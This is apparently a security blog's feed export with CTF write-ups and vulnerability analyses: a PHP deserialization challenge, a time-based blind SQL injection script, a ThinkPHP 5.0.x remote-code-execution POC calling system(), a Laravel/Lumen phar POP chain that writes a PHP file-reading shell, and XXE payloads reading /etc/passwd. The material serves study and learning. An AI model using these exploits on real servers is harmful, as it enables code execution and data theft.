&quot;./{$this-&gt;filename}&quot;;                    if (file_get_contents($file))                     {                              return file_get_contents($file);             }              else             {                 return &quot;you must be joking!&quot;;             }            }    }  }  class sec {      function read()         {                  return &quot;it&#39;s so sec~~&quot;;          }  }  if (isset($_GET[&#39;data&#39;]))  {     $Input_data = unserialize($_GET[&#39;data&#39;]);    echo $Input_data; } else {     highlight_file(&quot;./index.php&quot;); } ?&gt;</code></pre><h3 id="考点"><a href="#考点" class="headerlink" title="考点"></a>考点</h3><p>考点一：echo可以调用toString()函数用来返回flag.php内容</p><p>考点二：让$this-&gt;nice是一个非baby的类，就能绕过$str</p><p>考点三：unserialize()不会执行<strong>construct，外部不可控protected变量skyobj，但是序列化时可以放到</strong>construct内部控制</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>class baby {       protected $skyobj;      function __construct()     {          $this-&gt;skyobj = new cool;    $this-&gt;skyobj-&gt;amzing = serialize(new sec);    $this-&gt;skyobj-&gt;filename = &quot;flag.php&quot;;    }  }class sec {    function read(){}}class cool {     public $filename;         public $nice;    public $amzing; }$test = new baby();echo urlencode(serialize($test));</code></pre><h2 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h2><p>约束攻击登陆admin</p><p>登陆后盲注</p><p>EXP</p><pre><code>#!/usr/bin/env python# encoding: utf-8import requestsimport timedef login(payload):    url = &quot;http://106.12.21.77/Admin/User/Index?search[table]=flag/**/where/**/1/**/and/**/%s&quot; % (payload)    # print &quot;[+] %s&quot; % (url)    before_time = time.time()    cookies = {&#39;PHPSESSID&#39;: &#39;3kus5jrhoqav8te0kf74hglii7&#39;}    response = requests.get(url, cookies=cookies)    # content = response.content    after_time = time.time()    offset = after_time - before_time    # print &quot;[*] Offset : %f&quot; % (offset)    if offset &gt; 2.5:        return True    else:        return Falsedef main():    data = &quot;&quot;    charaters = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;    for i in range(1, 40, 1):        for j in charaters:            payload = &quot;if((mid((select/**/flag/**/from/**/flag),%d,1))=&#39;%s&#39;,sleep(3),0)%%23&quot; % (i, j)            if login(payload):                data += str(j)                print &quot;[+] Found : %s&quot; % (data)                breakif __name__ == &quot;__main__&quot;:    main()</code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><pre><code>binwalk -e zhu.jpg</code></pre><p>Stegsolve</p><h2 id="MISC2"><a href="#MISC2" class="headerlink" title="MISC2"></a>MISC2</h2><h3 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h3><p>volatility一把梭</p><pre><code>volatility imageinfo -f memory #分析操作系统volatility hashdump -f memory --profile=WinXPSP2x86 #查看当前操作系统中的 password hash</code></pre><p><img src="https://i.loli.net/2019/01/26/5c4c0c216b399.jpg" alt></p><p>得到管理员hash如下：</p><pre><code>Administrator:500:0182bd0bd4444bf867cd839bf040d93b:c22b315c040ae6e0efee3518d830362b:::</code></pre><p>所以<code>c22b315c040ae6e0efee3518d830362b</code>即为管理员密码的md5值，解出来是123456789，再md5一下就行。</p><h3 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h3><p>内存取证工具 volatility 使用说明：<a href="https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/" target="_blank" rel="noopener">https://www.restran.net/2017/08/10/memory-forensics-tool-volatility/</a></p><h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="键盘密码"><a href="#键盘密码" class="headerlink" title="键盘密码"></a>键盘密码</h2><p>ypau -&gt; flag</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;a href=&quot;#安恒杯月赛19新年场WriteUp&quot; class=&quot;headerlink&quot; title=&quot;安恒杯月赛19新年场WriteUp&quot;&gt;&lt;/a&gt;安恒杯月赛19新年场WriteUp&lt;/h1&gt;&lt;h1 id=&quot;Web&quot;&gt;
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5.0.0~5.0.23RCE漏洞分析</title>
    <link href="https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/01/20/ThinkPHP5.0.0~5.0.23RCE漏洞分析/</id>
    <published>2019-01-19T16:00:00.000Z</published>
    <updated>2019-01-30T15:59:18.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ThinkPHP5-0-0-5-0-23RCE漏洞分析"><a href="#ThinkPHP5-0-0-5-0-23RCE漏洞分析" class="headerlink" title="ThinkPHP5.0.0~5.0.23RCE漏洞分析"></a>ThinkPHP5.0.0~5.0.23RCE漏洞分析</h1><p>最近TP5一直在爆洞，既然浪潮在，就有必要跟进分析一下。但是由于自己对TP5框架流程不是很了解，所以有了这篇边摸索边分析的文章。</p><h1 id="TP5框架流程"><a href="#TP5框架流程" class="headerlink" title="TP5框架流程"></a>TP5框架流程</h1><p>应用启动在App.php的run()函数，说一下自己对这个框架的大致理解</p><p><strong>用户请求 -&gt; 路由解析 -&gt; 调度请求 -&gt; 执行操作 -&gt; 响应输出</strong></p><p><img src="https://i.loli.net/2019/01/20/5c43f7bb2d673.png" alt></p><p>App.php代码部分流程如下：  (自己的理解，可能有不对的地方，望斧正<br>1、应用初始化<code>initModule()</code><br>2、run()-&gt;routeCheck()对用户的get请求进行路由检测<br>3、若注册了路由则返回相应的调度值，若路由检测无效(即没有注册路由)则返回调度值为module<br>4、根据调度值，处理不同请求</p><pre><code>switch (self::$dispatch[&#39;type&#39;]) {    case &#39;redirect&#39;:        header(&#39;Location: &#39; . self::$dispatch[&#39;url&#39;], true, self::$dispatch[&#39;status&#39;]);        break;    case &#39;module&#39;:       $data = self::module(self::$dispatch[&#39;module&#39;], $config);        break;    case &#39;controller&#39;:        $data = Loader::action(self::$dispatch[&#39;controller&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;method&#39;:        $data = self::invokeMethod(self::$dispatch[&#39;method&#39;], self::$dispatch[&#39;params&#39;]);        break;    case &#39;function&#39;:        $data = self::invokeFunction(self::$dispatch[&#39;function&#39;], self::$dispatch[&#39;params&#39;]);        break;    default:        throw new Exception(&#39;dispatch type not support&#39;, 10008);}</code></pre><p>5、执行处理，返回输出。</p><p>TP5中get的路由请求参数为s。若get请求时s参数不存在，则调度类型默认值为module，调度方法实现<code>self::module()</code>，即进入MVC的处理方式：Controller层调用Module处理数据返回给View到用户。</p><p>所以核心操作就是调度请求。</p><h1 id="回到正题"><a href="#回到正题" class="headerlink" title="回到正题"></a>回到正题</h1><p>这个漏洞的产生是因为对_method参数过滤不严导致$filter变量覆盖</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><pre><code>http://127.0.0.1/thinkphp/thinkphp_5.0.22_with_extend/public/index.php?s=captchaPOST:_method=__construct&amp;filter[]=system&amp;method=get&amp;get[]=whoami</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>App.php部分代码：</p><pre><code>&lt;?php/*** 执行应用程序* @access public* @param  Request $request 请求对象* @return Response* @throws Exception*/public static function run(Request $request = null){    $request = is_null($request) ? Request::instance() : $request;    try {        ...        // 获取应用调度信息        $dispatch = self::$dispatch;        // 未设置调度信息则进行 URL 路由检测        if (empty($dispatch)) {            $dispatch = self::routeCheck($request, $config);        }        ...        $data = self::exec($dispatch, $config);    } catch (HttpResponseException $exception) {        ...    }    ...}</code></pre><p>看到<code>$dispatch = self::routeCheck($request, $config)</code>，$request是http请求对象，通过调用Request类中的method方法来获取当前的http请求类型，该函数的实现在<code>thinkphp/library/think/Request.php:512</code></p><pre><code>&lt;?php/**    * 当前的请求类型    * @access public    * @param bool $method  true 获取原始请求类型    * @return string    */public function method($method = false){    if (true === $method) {        // 获取原始请求类型        return $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;    } elseif (!$this-&gt;method) {        if (isset($_POST[Config::get(&#39;var_method&#39;)])) {            $this-&gt;method = strtoupper($_POST[Config::get(&#39;var_method&#39;)]);            $this-&gt;{$this-&gt;method}($_POST);        } elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) {            $this-&gt;method = strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);        } else {            $this-&gt;method = $this-&gt;server(&#39;REQUEST_METHOD&#39;) ?: &#39;GET&#39;;        }    }    return $this-&gt;method;}</code></pre><p>var_method的伪装变量值为_method<br><img src="https://i.loli.net/2019/01/20/5c43fee616aac.png" alt></p><p>因此通过POST一个_method参数，即可进入判断，并执行<code>$this-&gt;{$this-&gt;method}($_POST)</code>语句。因此通过指定_method即可完成对该类的任意方法的调用，其传入对应的参数即对应的$_POST数组。在poc里看到传入的<strong>method为</strong>construct，代码如下</p><pre><code>&lt;?phpprotected function __construct($options = []){    foreach ($options as $name =&gt; $item) {        if (property_exists($this, $name)) {            $this-&gt;$name = $item;        }    }    if (is_null($this-&gt;filter)) {        $this-&gt;filter = Config::get(&#39;default_filter&#39;);    }    // 保存 php://input    $this-&gt;input = file_get_contents(&#39;php://input&#39;);}</code></pre><p>利用foreach循环，和POST传入数组即可对Request对象的成员属性进行覆盖。经过覆盖后的结果<br><img src="https://i.loli.net/2019/01/20/5c43f8a3b1ee9.png" alt></p><p>这里也就解释了poc中为什么要传入method=get。为了使$this-&gt;method=get才能对应上面Request.php的method()方法返回值，否则程序报错</p><p>request对象差不多清楚了，跟进self::routeCheck()</p><pre><code>&lt;?php/** * URL路由检测（根据PATH_INFO) * @access public * @param  \think\Request $request 请求实例 * @param  array          $config  配置信息 * @return array * @throws \think\Exception */public static function routeCheck($request, array $config){    $path   = $request-&gt;path();  //path=captcha    $depr   = $config[&#39;pathinfo_depr&#39;];    $result = false;    // 路由检测（根据路由定义返回不同的URL调度）    $result = Route::check($request, $path, $depr, $config[&#39;url_domain_deploy&#39;]);    return $result;</code></pre><p>根据$request的get请求进行路由检测，在vendor/topthink/think-captcha/src/helper.php中captcha注册了路由，因此其对应的URL调度值为method<br><img src="https://i.loli.net/2019/01/20/5c43feb394e5f.png" alt></p><p>再返回App.php继续执行<code>$data = self::exec($dispatch, $config);</code></p><pre><code>&lt;?phpprotected static function exec($dispatch, $config){    switch ($dispatch[&#39;type&#39;]) {        ...        case &#39;method&#39;: // 回调方法            $vars = array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);            $data = self::invokeMethod($dispatch[&#39;method&#39;], $vars);            break;        ...    }    return $data;}</code></pre><p>介绍的，根据调度值的不同处理不同请求，此时我们的dispatch为method。继续跟进<code>Request::instance()-&gt;param()</code></p><pre><code>&lt;?phppublic function param($name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    if (empty($this-&gt;mergeParam)) {        $method = $this-&gt;method(true);        ...    }    ...    // 当前请求参数和URL地址中的参数合并    $this-&gt;param      = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));    $this-&gt;mergeParam = true;    ...    return $this-&gt;input($this-&gt;param, $name, $default, $filter);}</code></pre><p>array_merge用来合并参数，此时$this-&gt;param为一个数组，且第一个值为我们刚才覆盖的get值<br><img src="https://i.loli.net/2019/01/20/5c43f82e8ae5b.png" alt></p><p>继续跟进<code>$this-&gt;input($this-&gt;param, $name, $default, $filter)</code></p><pre><code>&lt;?phppublic function input($data = [], $name = &#39;&#39;, $default = null, $filter = &#39;&#39;){    ...    // 解析过滤器    $filter = $this-&gt;getFilter($filter, $default);    if (is_array($data)) {        array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);        reset($data);    }    ...}</code></pre><p>跟进getFilter</p><pre><code>protected function getFilter($filter, $default){    if (is_null($filter)) {        $filter = [];    } else {        $filter = $filter ?: $this-&gt;filter;        if (is_string($filter) &amp;&amp; false === strpos($filter, &#39;/&#39;)) {            $filter = explode(&#39;,&#39;, $filter);        } else {            $filter = (array) $filter;        }    }    $filter[] = $default;    return $filter;}</code></pre><p>到这逻辑就很清楚了，在input函数里面获得$filter值为我们之前覆盖的$this-&gt;filter，$data是实参传入的$this-&gt;param数组，接着调用 array_walk_recursive()进行自定义函数处理，函数名为filterValue()<br><img src="https://i.loli.net/2019/01/20/5c43f84376fdb.png" alt></p><p>从而调用call_user_func进行RCE</p><h1 id="官方补丁"><a href="#官方补丁" class="headerlink" title="官方补丁"></a>官方补丁</h1><p>看一下diff<br><img src="https://i.loli.net/2019/01/20/5c43f86c5eec1.png" alt></p><p>触发漏洞点就是method可控，进而调用任意函数。补丁对参数method进行了白名单</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><a href="https://xz.aliyun.com/t/3845#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/3845#toc-1</a></li><li><a href="https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003" target="_blank" rel="noopener">https://github.com/top-think/framework/commit/4a4b5e64fa4c46f851b4004005bff5f3196de003</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119426" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119426</a></li><li><a href="https://www.kancloud.cn/zmwtp/tp5/119428" target="_blank" rel="noopener">https://www.kancloud.cn/zmwtp/tp5/119428</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot;&gt;&lt;a href=&quot;#ThinkPHP5-0-0-5-0-23RCE漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5.0.0~5.0.23RCE漏洞分析&quot;&gt;&lt;/a&gt;Think
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Code-breaking-medium之lumenserial</title>
    <link href="https://hpdoger.cn/2019/01/09/Code-breaking-medium%D6%AElumenserial/"/>
    <id>https://hpdoger.cn/2019/01/09/Code-breaking-medium֮lumenserial/</id>
    <published>2019-01-08T16:00:00.000Z</published>
    <updated>2019-01-09T13:50:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Code-breaking-medium之lumenserial"><a href="#Code-breaking-medium之lumenserial" class="headerlink" title="Code-breaking-medium之lumenserial"></a>Code-breaking-medium之lumenserial</h1><p>一道pop链很深的题，复现了一天，到目前已经有九个人做了。太菜了，只能照着柠檬和kk师傅的wp来学习思路。通过这次的复现，感受到耐心对审计的importance。记录一下在学习wp过程中得到的他见与己见。</p><p>题目地址：<a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p><h1 id="前期"><a href="#前期" class="headerlink" title="前期"></a>前期</h1><p>一个ueditor的页面</p><p>在App\Http\Controllers的EditorController.php里提供了远程下载功能</p><pre><code>private function download($url){    $content = file_get_contents($url);</code></pre><p>url可控为以GET形式传入的source值，由于禁止了以下函数，所以只能利用Phar反序列化再打通pop链</p><pre><code>system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec,mail,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log</code></pre><h1 id="Searching-POP-chain"><a href="#Searching-POP-chain" class="headerlink" title="Searching POP chain"></a>Searching POP chain</h1><p>因为phar反序列化不会反序列化类中的具体函数，所以要找两个魔法方法入口：<code>__destruct|__wakeup</code>这点在柠檬师傅的博客园看到的，也算是经验之谈了。</p><p>首先在namespace Illuminate\Broadcasting里找到PendingBroadcast类存在destruct</p><pre><code>class PendingBroadcast{   public function __construct(Dispatcher $events, $event){    $this-&gt;event = $event;    $this-&gt;events = $events;}public function __destruct()    {        $this-&gt;events-&gt;dispatch($this-&gt;event);    }}</code></pre><p>Dispatcher是一个接口，所以这里$event、$events应该都是一个继承于这个接口的obj。但是看了下，一共就只有两个类继承于Dispatcher(BusFake、EventFake)，且都无法利用。所以转向去寻找存在__call方法的类，看是否可以利用。</p><p>为什么要找存在_call方法的类的？根据PHP文档，当一个类里没有定义的方法时，在执行这个不存在方法时，它就会自动调用该类里的__call方法来实现方法重载。</p><p>所以要找一个有_call方法的类–&gt;类ValidGenerator。</p><h1 id="ValidGenerator"><a href="#ValidGenerator" class="headerlink" title="ValidGenerator"></a>ValidGenerator</h1><pre><code>public function __call($name, $arguments){    $i = 0;    do {        $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);        $i++;        if ($i &gt; $this-&gt;maxRetries) {            throw new \OverflowException(sprintf(&#39;Maximum retries of %d reached without finding a valid value&#39;, $this-&gt;maxRetries));        }    } while (!call_user_func($this-&gt;validator, $res));    return $res;}</code></pre><p>$name的值就是dispatch。如果我们能控制$res，就相当于能控制call_user_func的函数和参数</p><p>由于在call_user_func_array()中，Generator类没有定义dispatch函数，所以又会调用Generator类的_call函数，跟进Generator类</p><h1 id="Generator类"><a href="#Generator类" class="headerlink" title="Generator类"></a>Generator类</h1><pre><code>public function __call($method, $attributes) {    return $this-&gt;format($method, $attributes);}</code></pre><p>继续跟进format方法</p><pre><code>public function format($formatter, $arguments = array()){    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);  }</code></pre><p>$formatter的值不可控，且初值为dispatch，继续跟进getFormatter()</p><pre><code>public function getFormatter($formatter){    if (isset($this-&gt;formatters[$formatter])) {        return $this-&gt;formatters[$formatter];    }</code></pre><p>在这步似乎看到了希望，因为它return 了一个数组的值，就比较好控。想办法让<strong>$this-&gt;getFormatter($formatter)</strong>的值是一个数组，即第一次<strong>getFormatter()</strong>返回的值是数组。数组只有一个值仍为<strong>getFormatter</strong>，此时$arguemnts为空，因为call_user_func_array，它就会再调用一次getFormatter方法，参数为空。</p><p>根据getFormatter方法当参数为空时，返回formatters成员的第一个值。</p><p>所以我们需要有两个Generator类：第一个类的formatters成员的键名为dispacth，键值为一个数组(内容为第二个Generator类名$ob2、方法名getFormatter);第二个Generator类的formatters键名随意，键值为我们想要控制的类,此时$res就算可控了。</p><h1 id="回身处理validator"><a href="#回身处理validator" class="headerlink" title="回身处理validator"></a>回身处理validator</h1><p>那么$this-&gt;validator如何处理呢？</p><p>这里看到师傅们找的了一个跳板类，赋值给了validator</p><p><code>phpunit\phpunit\src\Framework\MockObject\Stub\ReturnCallback.php:26</code></p><pre><code>namespace PHPUnit\Framework\MockObject\Stub;class ReturnCallback implements Stub{public function invoke(Invocation $invocation){    return \call_user_func_array($this-&gt;callback, $invocation-&gt;getParameters());}</code></pre><h2 id="invocation接口实现方法"><a href="#invocation接口实现方法" class="headerlink" title="invocation接口实现方法"></a>invocation接口实现方法</h2><p>getParameters()是接口的一个方法，用来访问私有属性parameters的值</p><p>找到调用这个接口的类就行了，这里是</p><pre><code>namespace PHPUnit\Framework\MockObject\Invocation;class StaticInvocation implements Invocation, SelfDescribing{private $parameters;}</code></pre><p>这个类可以通过上面getFormatter方法控制。至此，invoke()里call_user_func_array中的两个参数我们都可控了</p><h2 id="构建POC思路"><a href="#构建POC思路" class="headerlink" title="构建POC思路"></a>构建POC思路</h2><p>给validator一个数组(内容为实例化的ReturenCallback类、invoke方法名)。即$this-&gt;validator参数就成了invoke()，从而让call_user_func调用invoke方法，invoke方法中的Call_user_func_arrary再执行可控函数来getshell</p><p>总结一下，Invoke的回调函数能getshell的原因有二：<br>1、$this-&gt;callback 反序列化可控<br>2、继承invocation的类名返回值可控(getFormatter实现)</p><h1 id="Final-EXP"><a href="#Final-EXP" class="headerlink" title="Final-EXP"></a>Final-EXP</h1><p>看到kk师傅有一个exp写的很好，把审计流程串成EXP，稍作改动，这里贴出来学习下</p><pre><code>&lt;?phpnamespace Illuminate\Broadcasting{    class PendingBroadcast{        function __construct(){            $this-&gt;events = new \Faker\ValidGenerator();            $this-&gt;event = &#39;everything&#39;;        }    }}namespace PHPUnit\Framework\MockObject\Invocation{    class StaticInvocation{        function __construct(){            $this-&gt;parameters = array(&#39;/var/www/html/upload/hpdoger.php&#39;,&#39;&lt;?php print_r(file_get_contents(&#39;../../flag_larave1_b0ne&#39;));?&gt;&#39;);        }    }}namespace PHPUnit\Framework\MockObject\Stub{    class ReturnCallback{        function __construct(){            $this-&gt;callback = &#39;file_put_contents&#39;;        }    }}namespace Faker{    class ValidGenerator{        function __construct(){            $evilobj = new \PHPUnit\Framework\MockObject\Invocation\StaticInvocation();            $g1 = new \Faker\Generator(array(&#39;everything&#39; =&gt; $evilobj ));            $g2 = new \Faker\Generator(array(&quot;dispatch&quot; =&gt; array($g1, &quot;getFormatter&quot;)));            $rc = new \PHPUnit\Framework\MockObject\Stub\ReturnCallback();            $this-&gt;validator = array($rc, &quot;invoke&quot;);            $this-&gt;generator = $g2;            $this-&gt;maxRetries = 10000;        }    }    class Generator{        function __construct($form){            $this-&gt;formatters = $form;        }    }}namespace{    $exp = new Illuminate\Broadcasting\PendingBroadcast();    print_r(urlencode(serialize($exp)));    // phar    $p = new Phar(&#39;./hpdoger.phar&#39;, 0);    $p-&gt;startBuffering();    $p-&gt;setStub(&#39;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#39;);    $p-&gt;setMetadata($exp);    $p-&gt;addFromString(&#39;1.txt&#39;,&#39;text&#39;);    $p-&gt;stopBuffering();}</code></pre><p>上传文件，接着进行反序列化</p><pre><code>http://51.158.73.123:8080/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/9af04fac3af8c9d11572234ca3c4c98b/201901/09/26b5b639d9f75a9426cf.gif</code></pre><p><img src="https://i.loli.net/2019/01/09/5c35f967d6ab3.png" alt></p><p>再次膜前辈师傅们</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Code-breaking-medium之lumenserial&quot;&gt;&lt;a href=&quot;#Code-breaking-medium之lumenserial&quot; class=&quot;headerlink&quot; title=&quot;Code-breaking-medium之lumense
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>从两道CTF题目学习XXE漏洞</title>
    <link href="https://hpdoger.cn/2019/01/07/%E4%BB%8E%E4%B8%A4%E9%81%93CTF%E9%A2%98%E7%9B%AE%E5%AD%A6%E4%B9%A0XXE%E6%BC%8F%E6%B4%9E/"/>
    <id>https://hpdoger.cn/2019/01/07/从两道CTF题目学习XXE漏洞/</id>
    <published>2019-01-06T16:00:00.000Z</published>
    <updated>2019-01-07T08:52:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从两道CTF题目学习XXE漏洞"><a href="#从两道CTF题目学习XXE漏洞" class="headerlink" title="从两道CTF题目学习XXE漏洞"></a>从两道CTF题目学习XXE漏洞</h1><p>接触安全到现在，一直没有碰xxe相关的知识。一是觉得xml类型的东西太概念化了，二是觉得实用性不大，因为现在很少见到用xml形式来传输数据。不巧的是最近35CTF就有一道blind xxe题目，干脆把之前的坑填了，从零来学习一下XXE漏洞</p><h1 id="XML相关知识"><a href="#XML相关知识" class="headerlink" title="XML相关知识"></a>XML相关知识</h1><h2 id="什么是XML"><a href="#什么是XML" class="headerlink" title="什么是XML"></a>什么是XML</h2><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><p><strong>通俗点来说就是存储数据的一种格式</strong><br><img src="https://i.loli.net/2019/01/06/5c319a94ce60c.jpg" alt><br>它的形式类似于html，都是标签闭合，且有根元素和子元素说法，例如note就是根元素，from和to都是子元素</p><h2 id="什么是实体"><a href="#什么是实体" class="headerlink" title="什么是实体"></a>什么是实体</h2><p>实体有以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p><strong>实体根据引用方式，还可分为内部实体与外部实体。</strong>这里简要说一下内部实体和引发XXE漏洞的外部实体、参数实体</p><h3 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h3><p>即在xml文档中自定义一个实体<br>格式：<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code>，这是一种引入形式，好比C中引入变量都要声明变量，只不过在XML里引入的不叫变量，而叫做<strong>实体</strong></p><p><img src="https://i.loli.net/2019/01/06/5c31a36c41df0.png" alt></p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>格式：<code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</code>，在xml里不给实体赋予具体的值，而是通过某URI引入，叫做外部实体引入</p><p>下面是支持使用的URI<br><img src="https://thief.one/upload_image/20170620/1.png" alt></p><p>关于外部实体引用file协议的例子如下：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;&lt;root&gt;&amp;file;&lt;/root&gt;</code></pre><h3 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h3><pre><code>&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;或者&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</code></pre><p>外部引入参数实体的例子：</p><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE a [    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;    %name;]&gt;</code></pre><p>注意:%name（参数实体）是<strong>在DTD中被引用</strong>的，而其余实体是在xml文档中被引用的。</p><h2 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h2><p>W3C定义：DTD即文档类型定义（document type define）,可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。<br>DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p><p>我理解的DTD是构建一个区域，声明在区域中要引入的实体\元素</p><h3 id="内部声明DTD"><a href="#内部声明DTD" class="headerlink" title="内部声明DTD"></a>内部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 [元素声明]&gt;</code></p><p><img src="https://i.loli.net/2019/01/06/5c319fbbd03ee.png" alt></p><p>即在xml文档内部用DTD声明：我的根元素是root，在根元素下有to、from这些元素。</p><p>其实，你声明的元素和下面的元素名称不对应时也会进行解析。所以我觉得用DTD的用处就是给使用者一个目录栏，为了告诉他们下面的元素结构是什么样子的，而目录栏标题的名字是否正确不做强制要求。</p><p><strong>PS：#PCDATA的意思是解析字符数据</strong></p><h3 id="外部声明DTD"><a href="#外部声明DTD" class="headerlink" title="外部声明DTD"></a>外部声明DTD</h3><p>语法：<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</code>,即引入外部的dtd声明,其中dtd文件就是引入的实体</p><p><img src="https://i.loli.net/2019/01/06/5c31a1a35b693.png" alt></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。</p><p>上文的外部实体引入部分，可以调用URI来加载数据，这也是造成漏洞点的地方。</p><h2 id="有回显的XXE"><a href="#有回显的XXE" class="headerlink" title="有回显的XXE"></a>有回显的XXE</h2><p>jarvisoj平台上的题目</p><p>题目描述：请设法获得目标机器/home/ctf/flag.txt中的flag值</p><p><img src="https://i.loli.net/2019/01/06/5c31b29f0180e.png" alt></p><h2 id="35CTF-Blind-XXE"><a href="#35CTF-Blind-XXE" class="headerlink" title="35CTF Blind XXE"></a>35CTF Blind XXE</h2><p>这个是XXE漏洞能够利用的普遍场景，一般能利用XXE的地方有回显的机率几乎为0。利用blind xxe把数据外带到自己的服务器</p><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>代码如下：</p><pre><code>&lt;?php  function __autoload($cls) {    include $cls;  }  class Black {    public function __construct($string, $default, $keyword, $store) {      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#0d0d0d&quot;);      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#0d0d0d&quot;);      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#0d0d0d&quot;);      if ($store) {            setcookie(&#39;theme&#39;, &quot;Black-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);      }    }  }  class Green {    public function __construct($string, $default, $keyword, $store) {      if ($string) ini_set(&quot;highlight.string&quot;, &quot;#00fb00&quot;);      if ($default) ini_set(&quot;highlight.default&quot;, &quot;#00fb00&quot;);      if ($keyword) ini_set(&quot;highlight.keyword&quot;, &quot;#00fb00&quot;);      if ($store) {            setcookie(&#39;theme&#39;, &quot;Green-&quot;.$string.&quot;-&quot;.$default.&quot;-&quot;.$keyword, 0, &#39;/&#39;);      }    }  }  if ($_=@$_GET[&#39;theme&#39;]) {    if (in_array($_, [&quot;Black&quot;, &quot;Green&quot;])) {      if (@class_exists($_)) {        ($string = @$_GET[&#39;string&#39;]) || $string = false;        ($default = @$_GET[&#39;default&#39;]) || $default = 